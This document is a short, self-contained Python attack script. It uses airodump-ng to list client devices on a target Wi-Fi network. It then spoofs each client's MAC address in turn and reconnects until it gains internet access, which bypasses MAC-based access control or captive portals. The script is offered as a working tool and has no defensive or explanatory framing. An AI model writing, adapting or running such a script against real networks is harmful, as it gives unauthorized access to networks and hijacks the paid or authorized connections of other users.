#! /usr/bin/python3

from subprocess import getoutput, Popen, DEVNULL
import sys
import csv
import os
from time import sleep

if not len(sys.argv) == 4:
    print("Usage: {} <monitor_interface> <interface> <ESSID>".format(__file__))
    exit(1)

monitor_iface = sys.argv[1]
iface = sys.argv[2]
essid = sys.argv[3]
netctl_profile = None
bssids = []
stations = []
blacklist = []

print("[*] Monitor interface: {}".format(monitor_iface))
print("[*] Interface: {}".format(iface))
print("[*] Target ESSID: {}".format(essid))
print()

commmand = "/usr/bin/airodump-ng -a --essid {} --output-format csv -w /tmp/wifi_graper {}".format(essid, monitor_iface)
p = Popen(commmand.split(), stdout=DEVNULL, stderr=DEVNULL, stdin=DEVNULL)

for profile in os.listdir("/etc/netctl"):
    if profile.find(essid) != -1:
        netctl_profile = profile

if not netctl_profile:
    raise Exception("NetCtl connection profile not found")


def ip_assigned():
    if not len(getoutput("ifconfig {} | grep -v inet6 | grep inet".format(iface))):
        return False
    return True


def gots_internetz():
    if os.system("ping -c 5 google.com") == 0:
        return True
    if os.system("curl --connect-timeout 15 https://www.google.com") == 0:
        return True

    return False


while True:
    station_list_len = len(stations)
    if os.path.exists('/tmp/wifi_graper-01.csv'):
        with open('/tmp/wifi_graper-01.csv', 'r') as file:
            csv_file = csv.reader(file)
            for line in csv_file:
                if len(line) == 15:
                    parsed_essid = line[13].strip()
                    parsed_bssid = line[0].strip()
                    if (parsed_essid == essid) and (parsed_bssid not in bssids):
                        print("[+] Added {} to target BSSIDs".format(parsed_bssid))
                        bssids.append(parsed_bssid)
                elif len(line) == 7:
                    parsed_station = line[0].strip()
                    parsed_bssid = line[5].strip()
                    if (parsed_station not in blacklist) and (parsed_bssid in bssids):
                        stations.append(parsed_station)

        new_targets = len(stations) - station_list_len
        if new_targets:
            print("[+] Added {} new station(s) to target list".format(new_targets))

        for station in stations:
            if station not in blacklist:
                print("[*] Attempting to connect as {}".format(station))
                os.system("ifconfig {} hw ether {}".format(iface, station))
                os.system("netctl start {}".format(netctl_profile))

                while not ip_assigned():
                    sleep(5)

                if gots_internetz():
                    print("[+] Enjoy your internetz!!")
                    p.terminate()
                    exit(0)
                else:
                    print("[-] Added {} to blacklist".format(station))
                    os.system("netctl stop-all")
                    blacklist.append(station)
                    stations.remove(station)

    sleep(5)
